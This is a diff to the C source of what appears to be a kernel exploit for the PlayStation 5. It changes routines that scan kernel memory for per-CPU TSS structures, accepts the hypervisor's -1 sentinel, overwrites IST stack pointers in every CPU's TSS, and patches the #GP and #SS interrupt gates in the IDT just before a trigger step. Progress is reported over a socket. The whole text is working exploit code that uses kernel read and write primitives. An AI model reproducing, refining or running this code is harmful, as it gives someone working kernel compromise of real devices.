@@ -2979,11 +2979,11 @@ find_tss_in_kdata(int sock, int *stride_out)
                 continue;
 
             memcpy(&rsp0, buf + i + 4, 8);
-            /* rsp0 must be a valid kernel stack pointer.
-             * Reject 0, non-kernel, and sentinel values like -1.
-             * Also require 16-byte alignment (ABI stack alignment). */
-            if (rsp0 == 0 || rsp0 < (uint64_t)ktext_base ||
-                rsp0 == 0xFFFFFFFFFFFFFFFFULL || (rsp0 & 0xF) != 0)
+            /* rsp0 must be a kernel address or HV sentinel (-1).
+             * PS5 HV manages RSP0 itself, setting it to -1 in the
+             * kernel-visible TSS.  Accept -1 as valid. */
+            if (rsp0 == 0 || (rsp0 < (uint64_t)ktext_base &&
+                rsp0 != 0xFFFFFFFFFFFFFFFFULL))
                 continue;
 
             memcpy(&rsp1, buf + i + 12, 8);
@@ -2997,15 +2997,15 @@ find_tss_in_kdata(int sock, int *stride_out)
             if (rsvd64 != 0)
                 continue;
 
-            /* Validate IST1-7 (offsets 0x24..0x5b): each 0 or valid kernel addr.
-             * Reject sentinel value -1 (seen in false positives on PS5). */
+            /* Validate IST1-7 (offsets 0x24..0x5b): each must be 0,
+             * a valid kernel address, or -1 (HV sentinel on PS5). */
             int ist_ok = 1;
             for (int ist = 0; ist < 7; ist++) {
                 uint64_t ist_val;
                 memcpy(&ist_val, buf + i + 0x24 + ist * 8, 8);
                 if (ist_val != 0 &&
-                    (ist_val < (uint64_t)ktext_base ||
-                     ist_val == 0xFFFFFFFFFFFFFFFFULL)) {
+                    ist_val != 0xFFFFFFFFFFFFFFFFULL &&
+                    ist_val < (uint64_t)ktext_base) {
                     ist_ok = 0;
                     break;
                 }
@@ -3029,9 +3029,9 @@ find_tss_in_kdata(int sock, int *stride_out)
                     continue;
                 if (kernel_copyout(next_addr + 4, &next_rsp0, 8) != 0)
                     continue;
-                if (next_rsp0 >= (uint64_t)ktext_base && next_rsp0 != 0 &&
-                    next_rsp0 != 0xFFFFFFFFFFFFFFFFULL &&
-                    (next_rsp0 & 0xF) == 0) {
+                if (next_rsp0 != 0 &&
+                    (next_rsp0 >= (uint64_t)ktext_base ||
+                     next_rsp0 == 0xFFFFFFFFFFFFFFFFULL)) {
                     found_second = 1;
                     if (stride_out)
                         *stride_out = stride;
@@ -3145,8 +3145,9 @@ find_tss_via_gdt(int sock, int *stride_out)
             }
             if (kernel_copyout(base + 4, &tss_rsp0, 8) != 0)
                 continue;
-            if (tss_rsp0 == 0 || tss_rsp0 < ktext_base ||
-                tss_rsp0 == 0xFFFFFFFFFFFFFFFFULL) {
+            if (tss_rsp0 == 0 ||
+                (tss_rsp0 < ktext_base &&
+                 tss_rsp0 != 0xFFFFFFFFFFFFFFFFULL)) {
                 send_response(sock, "    rsp0=0x%lx (invalid, skip)\n",
                               tss_rsp0);
                 continue;
@@ -3164,9 +3165,9 @@ find_tss_via_gdt(int sock, int *stride_out)
                     continue;
                 if (kernel_copyout(base + stride + 4, &next_rsp0, 8) != 0)
                     continue;
-                if (next_rsp0 >= ktext_base && next_rsp0 != 0 &&
-                    next_rsp0 != 0xFFFFFFFFFFFFFFFFULL &&
-                    (next_rsp0 & 0xF) == 0) {
+                if (next_rsp0 != 0 &&
+                    (next_rsp0 >= ktext_base ||
+                     next_rsp0 == 0xFFFFFFFFFFFFFFFFULL)) {
                     if (stride_out) *stride_out = stride;
                     send_response(sock, "  TSS confirmed via GDT at "
                                  "0x%lx (stride=%d)\n", base, stride);
@@ -4690,8 +4691,9 @@ broad_done:
                     break;
                 }
                 if (kernel_copyout(cpu_tss + 4, &rsp0, 8) != 0 ||
-                    rsp0 == 0 || rsp0 < kaddr_min ||
-                    rsp0 == 0xFFFFFFFFFFFFFFFFULL) {
+                    rsp0 == 0 ||
+                    (rsp0 < kaddr_min &&
+                     rsp0 != 0xFFFFFFFFFFFFFFFFULL)) {
                     send_response(sock, "  CPU%d: rsp0=0x%lx (invalid), stopping\n",
                                   cpu, rsp0);
                     break;
@@ -4964,9 +4966,25 @@ broad_done:
             int idx = gp_ist_index - 1;
             for (int cpu = 0; cpu < num_cpus_found; cpu++) {
                 uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
-                kernel_setlong(cpu_tss + 0x24 + idx * 8, ist_stack_top);
+                uint64_t ist_off = cpu_tss + 0x24 + idx * 8;
+                /* Verify write target by reading first */
+                uint64_t old_val = kernel_getlong(ist_off);
+                send_response(sock, "  CPU%d IST%d: writing 0x%lx -> 0x%lx "
+                              "(at 0x%lx, was 0x%lx)\n",
+                              cpu, gp_ist_index, old_val, ist_stack_top,
+                              ist_off, old_val);
+                kernel_setlong(ist_off, ist_stack_top);
+                /* Verify write succeeded */
+                uint64_t verify = kernel_getlong(ist_off);
+                if (verify != ist_stack_top) {
+                    send_response(sock, "  CPU%d IST%d: WRITE FAILED "
+                                  "(read back 0x%lx, expected 0x%lx)\n",
+                                  cpu, gp_ist_index, verify, ist_stack_top);
+                    /* Abort — don't patch IDT with bad IST values */
+                    goto step7_cleanup;
+                }
                 ist_modified_percpu[cpu][idx] = 1;
-                send_response(sock, "  CPU%d IST%d -> 0x%lx\n",
+                send_response(sock, "  CPU%d IST%d -> 0x%lx (verified)\n",
                               cpu, gp_ist_index, ist_stack_top);
             }
         }
@@ -4974,15 +4992,23 @@ broad_done:
         send_response(sock, "  Patching IDT gates...\n");
         if (gp_needs_patch) {
             uint8_t new_byte = (idt_gate_saved[4] & 0xF8) | 7;
+            send_response(sock, "  #GP gate: writing byte at 0x%lx "
+                          "(0x%02x -> 0x%02x)\n",
+                          idt_access + 13 * 16 + 4,
+                          idt_gate_saved[4], new_byte);
             kernel_setchar(idt_access + 13 * 16 + 4, new_byte);
             idt_gate_modified = 1;
-            send_response(sock, "  #GP gate IST -> 7\n");
+            send_response(sock, "  #GP gate IST -> 7 (done)\n");
         }
         if (ss_needs_patch) {
             uint8_t new_byte = (ss_gate_saved[4] & 0xF8) | 7;
+            send_response(sock, "  #SS gate: writing byte at 0x%lx "
+                          "(0x%02x -> 0x%02x)\n",
+                          idt_access + 12 * 16 + 4,
+                          ss_gate_saved[4], new_byte);
             kernel_setchar(idt_access + 12 * 16 + 4, new_byte);
             ss_gate_modified = 1;
-            send_response(sock, "  #SS gate IST -> 7\n");
+            send_response(sock, "  #SS gate IST -> 7 (done)\n");
         }
 
         /* Step 3: Start writer thread NOW — right before trigger */
